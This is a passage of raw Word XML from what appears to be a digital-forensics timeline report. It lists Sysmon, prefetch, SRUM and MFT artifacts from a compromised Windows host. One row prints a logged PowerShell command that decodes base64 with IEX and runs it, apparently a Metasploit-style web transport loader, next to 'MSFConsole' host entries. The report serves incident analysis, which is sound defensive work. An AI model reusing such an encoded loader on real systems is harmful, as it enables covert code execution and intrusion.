            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TRACERT.EXE-EC2ABA23.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.859949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2764, ProcessGUID: e6e9f951-0e47-654e-9301-000000000500 | RuleName: - | MD5=2EFE82589249126CA80CC1C536FCBDDA,SHA256=5817A6B5D24D21E19A05A08253737B1D2842B612EC1B90F9B928D78FAD271092,IMPHASH=7A80F2FE2DD40125FA241B4F53DF08D1 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 6600, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18656</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:01.056649</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -m 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7720, ProcessGUID: e6e9f951-0e5d-654e-9401-000000000500 | RuleName: - | MD5=2EFE82589249126CA80CC1C536FCBDDA,SHA256=5817A6B5D24D21E19A05A08253737B1D2842B612EC1B90F9B928D78FAD271092,IMPHASH=7A80F2FE2DD40125FA241B4F53DF08D1 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 6600, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:12.550053</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2180, ProcessGUID: e6e9f951-0e68-654e-9501-000000000500 | RuleName: - | MD5=2EFE82589249126CA80CC1C536FCBDDA,SHA256=5817A6B5D24D21E19A05A08253737B1D2842B612EC1B90F9B928D78FAD271092,IMPHASH=7A80F2FE2DD40125FA241B4F53DF08D1 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 6600, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18658</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.181847</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>QUSER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=FE15F6D2 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#99</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\QUSER.EXE-FE15F6D2.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.182379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>quser</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7752, ProcessGUID: e6e9f951-0e85-654e-9601-000000000500 | RuleName: - | MD5=3147F9B0C7089DD698778246E835C494,SHA256=6EE15E5B1311D501FBDAA15C9D1197BA2F99745EA5ABB3E724D598EE53D48A6E,IMPHASH=EA8421BD383CD44D7C13D5BBB67DDFA5 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 6600, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18659</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, T-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application timeline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: end of application activity</w:t>
              <w:br/>
              <w:t>TRACERT.EXE</w:t>
              <w:br/>
              <w:t>duration_ms=120000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_AppTimelineProvider_Output.csv#1163</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.683825</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | Image: C:\Windows\explorer.exe | TargetFilename: C:\Users\medmondson\AppData\Local\Temp\__PSScriptPolicyTest_4aavzn1y.m2z.ps1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18660</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, I-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.853693</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 400 | PowerShell | Engine state is changed from None to Available | HostApplication=explorer.exe</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=MSFConsole</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=0.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28055</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, I-019, T-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.869319</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.4_WbZ_YN.20231110030640.txt</w:t>
              <w:br/>
              <w:t>size=12506</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119921</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.890383</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("DQpmdW5jdGlvbiBBZGQtV2ViVHJhbnNwb3J0IHsNCiAgPCMNCiAgICAuU1lOT1BTSVMNCiAgICAgIEFkZCBhIHdlYi1iYXNlZCB0cmFuc3BvcnQgKGh0dHAvcykgdG8gdGhlIGN1cnJlbnQgc2Vzc2lvbi4NCg0KICAgIC5QQVJBTUVURVIg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8744</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, T-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.900568</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 800 | PowerShell | Pipeline Execution Details | HostApplication=explorer.exe</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=MSFConsole</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=0.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28056</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:07:47.909571</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>"C:\Windows\system32\NOTEPAD.EXE" C:\Users\medmondson\Desktop\New Text Document.txt</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 932, ProcessGUID: e6e9f951-0f03-654e-aa01-000000000500 | RuleName: - | MD5=F1139811BBF61362915958806AD30211,SHA256=F1D62648EF915D85CB4FC140359E925395D315C70F3566B63BB3E21151CB2CE3,IMPHASH=E2D17AC7541817AA681AE8FF7734AD89 | ParentProcess: C:\Windows\explorer.exe | ParentProcessID: 2432, ParentProcessGU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18675</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:06.424384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
